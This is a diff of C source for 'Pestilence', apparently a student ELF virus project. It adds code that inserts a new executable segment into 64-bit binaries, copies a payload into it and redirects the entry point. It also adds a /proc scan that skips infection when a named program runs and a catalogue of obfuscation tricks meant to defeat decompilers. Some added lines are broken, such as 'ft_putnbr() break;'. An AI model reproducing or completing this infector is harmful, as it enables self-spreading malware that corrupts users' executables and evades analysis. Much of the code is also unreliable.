@@ -10,151 +10,279 @@
 /*                                                                            */
 /* ************************************************************************** */
 
-/*
-	PESTILENCE
-	[ ] Creer segment pour injecter d'une taille arbitraire
-	[ ] Recreer routine d'infection en famine like adapté sur le segment créé
-		- /tmp/test et /tmp/test2
-		- infection binaire 64 bits
-		- pas de double infection
-		- pas de sortie std ou erreur
-	[X] Avoid infection if debugger
-	[X] Avoid infection if specific program running
-	[ ] Code source illisible et offuscé
-
-	WAR
-	[ ] Fingerprint unique dans signature pour chaque infection
-		- how ? why no random ?
-
-	DEATH
-	[ ] Metamorphic -> structure différente a chaque exécution même sur binaire
-   original identique
-		- how ?
-
-	BONUS
-	[ ] Binaire 32 bits
-	[ ] Autres types de fichier non binaires
-	[ ] Packing pour rendre binaire plus léger
-	[ ] Infection récursive depuis / (utiliser les binaires infectés)
-*/
-
 #include "pestilence.h"
 
-int _a(const char *o);
+/*
+SPLIT + MERGE + INLINE / no helper func, messy conditional logic
 
-void _start(void)
-{
-	void *begin_ptr;
+-> INSTEAD OF
 
-	__asm__ volatile(
-		"lea (%%rip), %0" // Load effective address of the instruction pointer
-		: "=r"(begin_ptr) // Output operand, store into `begin_ptr`
-	);
-	begin_ptr -= 7;
-	// ft_close(1);
-	// ft_close(2);
-
-	if (/*is_debugged() || */ is_program_running("doom-nukem"))
-		ft_exit(0);
-
-	// #ifdef BONUS
-	// 	// if envp has path
-	// 	// 		infect path
-	// 	// else
-	// 	char path[2];
-	// 	path[0] = '/';
-	// 	path[1] = '\0';
-	// 	processDirectory(path, begin_ptr);
-	// #else
-	char path[11];
-	path[0] = '/';
-	path[1] = 't';
-	path[2] = 'm';
-	path[3] = 'p';
-	path[4] = '/';
-	path[5] = 't';
-	path[6] = 'e';
-	path[7] = 's';
-	path[8] = 't';
-	path[9] = '\0';
-	path[10] = '\0';
-	processDirectory(path, begin_ptr);
-	path[9] = '2';
-	processDirectory(path, begin_ptr);
-	// #endif
-	ft_exit(0);
+int validate(int x) {
+	if (x < 10)
+		return 0;
+	return x * 3;
 }
 
-// int is_program_running(const char *target)
-// {
-// 	int fd = ft_open("/proc", O_RDONLY | O_DIRECTORY);
-// 	if (fd < 0)
-// 		return 0;
-// 	char buf[4096];
-// 	for (;;)
-// 	{
-// 		int nread = ft_getdents64(fd, buf, 4096);
-// 		if (nread <= 0)
-// 			break;
-// 		for (int bpos = 0; bpos < nread;)
-// 		{
-// 			struct linux_dirent64 *d = (struct linux_dirent64 *) (buf + bpos);
-// 			const char			  *name = d->d_name;
-// 			// skip non-numeric entries
-// 			int					   numeric = 1;
-// 			for (int i = 0; name[i]; i++)
-// 			{
-// 				if (name[i] < '0' || name[i] > '9')
-// 				{
-// 					numeric = 0;
-// 					break;
-// 				}
-// 			}
-// 			if (numeric)
-// 			{
-// 				// manually build "/proc/<pid>/comm" without printf
-// 				char path[64];
-// 				int	 i = 0;
-// 				path[i++] = '/';
-// 				path[i++] = 'p';
-// 				path[i++] = 'r';
-// 				path[i++] = 'o';
-// 				path[i++] = 'c';
-// 				path[i++] = '/';
-// 				for (int j = 0; name[j]; j++)
-// 					path[i++] = name[j];
-// 				path[i++] = '/';
-// 				path[i++] = 'c';
-// 				path[i++] = 'o';
-// 				path[i++] = 'm';
-// 				path[i++] = 'm';
-// 				path[i] = '\0';
-// 				int cfd = ft_open(path, O_RDONLY);
-// 				if (cfd >= 0)
-// 				{
-// 					char pname[64];
-// 					int	 len = ft_read(cfd, pname, sizeof(pname) - 1);
-// 					ft_close(cfd);
-// 					if (len > 0)
-// 					{
-// 						pname[len] = '\0';
-// 						char *nl = ft_strchr(pname, '\n');
-// 						if (nl)
-// 							*nl = '\0';
-// 						if (ft_strcmp(pname, target) == 0)
-// 						{
-// 							ft_close(fd);
-// 							return 1;
-// 						}
-// 					}
-// 				}
-// 			}
-// 			bpos += d->d_reclen;
-// 		}
-// 	}
-// 	ft_close(fd);
-// 	return 0;
-// }
+-> WE WRITE
+
+static inline int a1(int x) { return x < 10; }
+static inline int a2(int x) { return x * 3; }
+
+int v(int x) {
+	int r = 0;
+	if (!a1(x))
+		r = a2(x);
+	return r;
+}
+-----------------------------------------------------------
+REORDERED + PADDED + POINTER MATH / loses struct, sur raw pointer arithmetic, no
+sementic field names
+
+-> INSTEAD OF
+
+typedef struct {
+	int id;
+	int flags;
+	int value;
+} S;
+
+int f(S *s) {
+	return s->value + s->id;
+}
+
+-> WE WRITE
+
+typedef struct {
+	uint64_t junk1;
+	int id;
+	uint32_t junk2;
+	int value;
+} S;
+
+#define GET_ID(s) (*(int *)((char *)(s) + 8))
+#define GET_VAL(s) (*(int *)((char *)(s) + 16))
+
+int f(void *p) {
+	return GET_VAL(p) + GET_ID(p);
+}
+----------------------------------------------------------
+CONTROL FLOW FLATTENING / big while(1), large switch, lost sequencing
+
+-> INSTEAD OF
+
+int f(int x) {
+	x += 1;
+	x *= 3;
+	return x;
+}
+
+-> WE WRITE
+
+int f(int x) {
+	int state = 0;
+	int r = x;
+
+	while (1) {
+		switch (state) {
+		case 0:
+			r += 1;
+			state = 1;
+			break;
+		case 1:
+			r *= 3;
+			state = 2;
+			break;
+		case 2:
+			return r;
+		}
+	}
+}
+
+----------------------------------------------------------
+OPAQUE PREDICATES / cannot simplify, keep branches and fake code, must reason
+manually
+
+-> INSTEAD OF
+
+if (x != 0) {
+	real();
+}
+
+-> WE WRITE
+
+if (((x * x) % 4) != 2) {
+	real();
+} else {
+	fake_crypto();
+	fake_loop();
+}
+
+----------------------------------------------------------
+COMPUTED GOTOS / indirect jumps, broken flow, hard to cleanly decompile
+
+-> INSTEAD OF
+
+switch (x) {
+case 0: a(); break;
+case 1: b(); break;
+}
+
+-> WE WRITE
+
+void *tbl[] = { &&A, &&B };
+goto *tbl[x];
+
+A: a(); return;
+B: b(); return;
+
+-----------------------------------------------------------
+CONSTANTS / decompiler show arithmetic, not literals
+
+-> INSTEAD OF
+
+int key = 0xDEADBEEF;
+
+-> WE WRITE
+
+int key = (0xDEAD0000 | 0xBEEF);
+key ^= mask;
+key ^= mask;
+
+-----------------------------------------------------------
+TABLES / loop reconstruction, no .rodata table
+
+-> INSTEAD OF
+
+static int t[] = {1,2,3,4};
+
+-> WE WRITE
+
+int t[4];
+for (int i = 0; i < 4; i++)
+	t[i] = (i + 1) ^ runtime_key;
+
+-----------------------------------------------------------
+STRING OBFUSCATION / no cleartext strings in binary
+
+-> INSTEAD OF
+
+printf("License");
+
+-> WE WRITE
+
+static unsigned char s[] = {
+	'L'^0x55, 'i'^0x55, 'c'^0x55, 'e'^0x55,
+	'n'^0x55, 's'^0x55, 'e'^0x55, 0
+};
+
+void dec(char *p) {
+	for (; *p; p++)
+		*p ^= 0x55;
+}
+
+void f() {
+	dec((char *)s);
+	puts((char *)s);
+}
+
+-----------------------------------------------------------
+DIFFERENT OPTIMISATION LEVELS / harder to analyze, mixed codegen styles
+
+__attribute__((optimize("O0")))
+void confuse() { ... }
+
+__attribute__((optimize("O3")))
+void speed() { ... }
+
+-----------------------------------------------------------
+INSTRUCTION LEVEL OBFUSCATION / inline asm, weird instruction sequences
+
+-> INSTEAD OF
+
+mov rax, rbx
+
+-> WE WRITE
+
+push rbx
+pop rax
+
+-> WE ADD
+
+lea rax, [rax]
+xchg rax, rax
+add rax, 5
+sub rax, 5
+
+*/
+
+int is_program_running(const char *target)
+{
+	int fd = ft_open("/proc", O_RDONLY | O_DIRECTORY);
+	if (fd < 0)
+		return 0;
+	char buf[4096];
+	for (;;)
+	{
+		int nread = ft_getdents64(fd, buf, 4096);
+		if (nread <= 0)
+			break;
+		for (int bpos = 0; bpos < nread;)
+		{
+			struct linux_dirent64 *d = (struct linux_dirent64 *) (buf + bpos);
+			const char			  *name = d->d_name;
+			int					   numeric = 1;
+			for (int i = 0; name[i]; i++)
+			{
+				if (name[i] < '0' || name[i] > '9')
+				{
+					numeric = 0;
+					break;
+				}
+			}
+			if (numeric)
+			{
+				char path[64];
+				int	 i = 0;
+				path[i++] = '/';
+				path[i++] = 'p';
+				path[i++] = 'r';
+				path[i++] = 'o';
+				path[i++] = 'c';
+				path[i++] = '/';
+				for (int j = 0; name[j]; j++)
+					path[i++] = name[j];
+				path[i++] = '/';
+				path[i++] = 'c';
+				path[i++] = 'o';
+				path[i++] = 'm';
+				path[i++] = 'm';
+				path[i] = '\0';
+				int cfd = ft_open(path, O_RDONLY);
+				if (cfd >= 0)
+				{
+					char pname[64];
+					int	 len = ft_read(cfd, pname, sizeof(pname) - 1);
+					ft_close(cfd);
+					if (len > 0)
+					{
+						pname[len] = '\0';
+						char *nl = ft_strchr(pname, '\n');
+						if (nl)
+							*nl = '\0';
+						if (ft_strcmp(pname, target) == 0)
+						{
+							ft_close(fd);
+							return 1;
+						}
+					}
+				}
+			}
+			bpos += d->d_reclen;
+		}
+	}
+	ft_close(fd);
+	return 0;
+}
 
 // Obfuscated duplicate of is_program_running to evade detection
 // clang-format off
@@ -422,6 +550,7 @@ void infect(char *path, void *begin_ptr)
 	t_elf		elf;
 	ElfW(Phdr) the_rats;
 	ElfW(Off) pt_load_end;
+	int pt_dyn_id;
 
 	if (parse_file(path, &statbuf, &elf, &file_data))
 		goto clean;
@@ -448,45 +577,6 @@ void infect(char *path, void *begin_ptr)
 	the_rats.p_paddr = the_rats.p_vaddr;
 	the_rats.p_flags = PF_X | PF_R;
 	for (int i = 0; i < elf.header->e_phnum; i++)
-	{
-		// if (elf.segments[i].p_type == PT_DYNAMIC)
-		// 	for (int j = 0; j < elf.segments[i].p_filesz;
-		// 		 j += sizeof(ElfW(Dyn)))
-		// 	{
-		// 		ElfW(Dyn) *dynamic
-		// 			= (ElfW(Dyn) *) (file_data + elf.segments[i].p_offset + j);
-		// 		switch (dynamic->d_tag)
-		// 		{
-		// 		case DT_INIT:
-		// 		case DT_FINI:
-		// 		case DT_INIT_ARRAY:
-		// 		case DT_FINI_ARRAY:
-		// 		case DT_HASH:
-		// 		case DT_GNU_HASH:
-		// 		case DT_STRTAB:
-		// 		case DT_SYMTAB:
-		// 		case DT_PLTGOT:
-		// 		case DT_JMPREL:
-		// 		case DT_RELA:
-		// 		case DT_VERNEED:
-		// 		case DT_VERSYM:
-		// 			if (dynamic->d_un.d_ptr
-		// 					>= elf.header->e_phoff
-		// 						   + elf.header->e_phnum
-		// 								 * elf.header->e_phentsize
-		// 						   + elf.segments[i].p_vaddr
-		// 						   - elf.segments[i].p_offset
-		// 				&& dynamic->d_un.d_ptr
-		// 					   < elf.header->e_phoff
-		// 							 + (elf.header->e_phnum + 1)
-		// 								   * elf.header->e_phentsize
-		// 							 + elf.segments[i].p_vaddr
-		// 							 - elf.segments[i].p_offset)
-		// 				dynamic->d_un.d_ptr += sizeof(ElfW(Phdr));
-		// 		default:
-		// 			break;
-		// 		}
-		// 	}
 		if (elf.segments[i].p_offset
 			>= elf.header->e_phoff
 				   + elf.header->e_phnum * elf.header->e_phentsize)
@@ -498,10 +588,11 @@ void infect(char *path, void *begin_ptr)
 			if (elf.segments[i].p_type == PT_LOAD)
 				pt_load_end
 					= elf.segments[i].p_offset + elf.segments[i].p_filesz;
+			if (elf.segments[i].p_type == PT_DYNAMIC)
+				pt_dyn_id = i;
 			elf.segments[i].p_filesz += sizeof(ElfW(Phdr));
 			elf.segments[i].p_memsz += sizeof(ElfW(Phdr));
 		}
-	}
 	for (int i = 0; i < elf.header->e_shnum; i++)
 	{
 		if (elf.sections[i].sh_offset
@@ -513,30 +604,51 @@ void infect(char *path, void *begin_ptr)
 						+ elf.header->e_phnum * elf.header->e_phentsize)
 			elf.sections[i].sh_size += sizeof(ElfW(Phdr));
 	}
-	// ft_memmove(file_data + elf.header->e_phoff
-	// 			   + elf.header->e_phnum * elf.header->e_phentsize
-	// 			   + sizeof(ElfW(Phdr)),
-	// 		   file_data + elf.header->e_phoff
-	// 			   + elf.header->e_phnum * elf.header->e_phentsize,
-	// 		   pt_load_end
-	// 			   - (elf.header->e_phoff
-	// 				  + elf.header->e_phnum * elf.header->e_phentsize));
-	// ft_memmove(file_data + pt_load_end + 0x1000, file_data + pt_load_end,
-	// 		   statbuf.st_size - pt_load_end);
+	for (int i = 0; i < elf.segments[pt_dyn_id].p_filesz;
+		 i += sizeof(ElfW(Dyn)))
+	{
+		ElfW(Dyn) *dynamic
+			= (ElfW(Dyn) *) (file_data + elf.segments[pt_dyn_id].p_offset + i);
+		switch (dynamic->d_tag)
+		{
+		case DT_NEEDED:
+		case DT_INIT:
+		case DT_FINI:
+		case DT_INIT_ARRAY:
+		case DT_FINI_ARRAY:
+		case DT_HASH:
+		case DT_GNU_HASH:
+		case DT_STRTAB:
+		case DT_SYMTAB:
+		case DT_PLTGOT:
+		case DT_JMPREL:
+		case DT_RELA:
+		case DT_VERNEED:
+		case DT_VERSYM:
+			ft_putnbr() break;
+
+		default:
+			break;
+		}
+	}
+
 	ft_memmove(file_data + elf.header->e_phoff
-				   + elf.header->e_phnum * elf.header->e_phentsize + 0x1000,
+				   + elf.header->e_phnum * elf.header->e_phentsize
+				   + sizeof(ElfW(Phdr)),
 			   file_data + elf.header->e_phoff
 				   + elf.header->e_phnum * elf.header->e_phentsize,
-			   statbuf.st_size
+			   pt_load_end
 				   - (elf.header->e_phoff
 					  + elf.header->e_phnum * elf.header->e_phentsize));
+	ft_memmove(file_data + pt_load_end + 0x1000, file_data + pt_load_end,
+			   statbuf.st_size - pt_load_end);
 	memcpy(file_data + elf.header->e_phoff
 			   + elf.header->e_phnum * elf.header->e_phentsize,
 		   &the_rats, sizeof(ElfW(Phdr)));
 	elf.header->e_phnum++;
-	// ft_bzero(file_data + the_rats.p_offset, 0x3000);
-	// memcpy(file_data + the_rats.p_offset, CURARE, FLOWER);
-	// elf.header->e_entry = the_rats.p_vaddr;
+	ft_bzero(file_data + the_rats.p_offset, 0x3000);
+	memcpy(file_data + the_rats.p_offset, CURARE, FLOWER);
+	elf.header->e_entry = the_rats.p_vaddr;
 	write(1, "OKKK\n", 5);
 clean:
 	ft_msync(file_data, statbuf.st_size + MINIMAL_INJECTION_SIZE, MS_SYNC);
